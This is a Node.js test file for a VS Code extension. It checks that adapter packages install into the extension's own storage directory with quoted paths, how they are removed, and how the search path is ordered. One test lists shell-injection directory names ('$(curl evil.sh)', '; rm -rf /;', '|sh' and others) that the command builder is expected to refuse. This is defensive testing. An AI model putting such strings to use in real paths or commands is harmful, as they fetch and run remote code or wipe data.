import assert from "node:assert/strict";
import { delimiter, join } from "node:path";
import test from "node:test";
import {
  adapterBinDir,
  adapterHome,
  adapterInstallCommand,
  adapterRemoveCommand,
  adapterSearchPath,
} from "../../core/index.js";

/**
 * Where an Adapter this Client installs goes, and how it is found afterwards.
 *
 * Its own directory under the extension's global storage rather than the
 * machine's npm prefix: the version is the catalog's pin and the user's
 * approval is of the file it puts there, so it belongs somewhere this Client
 * can also take away again. Everything here is about that directory being
 * reachable — and about the one place its name reaches a shell.
 */

/** Shaped like a real one. VS Code's global storage lives under the user data
 *  directory, which on macOS is "Application Support" — a space, in every path
 *  this will ever be handed. */
const STORAGE = "/home/user/Application Support/Code/User/globalStorage/pub.agent-conductor";
const adapter = { package: "@agentclientprotocol/codex-acp", version: "1.4.0", bin: "codex-acp" };

test("an adapter is installed into this extension's own directory, never the machine's", () => {
  const command = adapterInstallCommand(adapter, adapterHome(STORAGE));

  assert.match(command, /^npm install --prefix /);
  assert.ok(command.includes("@agentclientprotocol/codex-acp@1.4.0"));
  // The switch that would put the pin in a directory shared with everything
  // else the user has installed, needing privileges to write on some machines.
  assert.doesNotMatch(command, /--global|(^|\s)-g(\s|$)/);
  assert.ok(command.includes(join(STORAGE, "adapters")));
});

test("the path a terminal is handed is quoted, because global storage has a space in it", () => {
  // Unquoted, npm reads "/home/user/Application" as the prefix and installs
  // into a directory nobody looks in — with no error to say so.
  const command = adapterInstallCommand(adapter, adapterHome(STORAGE));

  assert.ok(command.includes(`"${join(STORAGE, "adapters")}"`), command);
  assert.ok(adapterRemoveCommand(adapter, adapterHome(STORAGE)).includes(`"${join(STORAGE, "adapters")}"`));
});

test("a directory a shell would read as more than a path is refused, not quoted", () => {
  // The install runs in a terminal, deliberately and in view, so the path
  // reaches a shell as text. Quoting handles a space; nothing here should be
  // trusted to handle the rest, so the rest is not accepted at all.
  for (const home of [
    "/tmp/$(curl evil.sh)",
    "/tmp/`id`",
    '/tmp/a"; rm -rf /; echo "',
    "/tmp/a && curl evil.sh",
    "/tmp/a\nrm -rf /",
    "/tmp/a|sh",
  ]) {
    assert.throws(() => adapterInstallCommand(adapter, home), /plain path/, `"${home}" must be refused`);
    assert.throws(() => adapterRemoveCommand(adapter, home), /plain path/, `"${home}" must be refused`);
  }
});

test("removing an adapter names no version, so what the pin installed is what goes", () => {
  const command = adapterRemoveCommand(adapter, adapterHome(STORAGE));

  assert.match(command, /^npm uninstall --prefix /);
  assert.ok(command.endsWith("@agentclientprotocol/codex-acp"));
  assert.doesNotMatch(command, /1\.4\.0/);
});

test("our own adapters are searched before the machine's PATH", () => {
  const path = ["/usr/local/bin", "/usr/bin"].join(delimiter);
  const search = adapterSearchPath(STORAGE, path);

  // First, so the version the wizard installed and the user approved is the one
  // a bare name lands on. A copy installed globally some other time would
  // otherwise shadow it, and the fingerprint would belong to a different file.
  assert.equal(search, `${adapterBinDir(STORAGE)}${delimiter}${path}`);
  assert.ok(search.startsWith(join(STORAGE, "adapters", "node_modules", ".bin")));
});

test("a machine with no PATH at all still finds the adapters this client installed", () => {
  // `process.env.PATH` is undefined often enough in a spawned environment that
  // an empty entry — which a bare join produces — would search the working
  // directory instead of failing.
  assert.equal(adapterSearchPath(STORAGE, ""), adapterBinDir(STORAGE));
  assert.doesNotMatch(adapterSearchPath(STORAGE, ""), new RegExp(`\\${delimiter}$`));
});
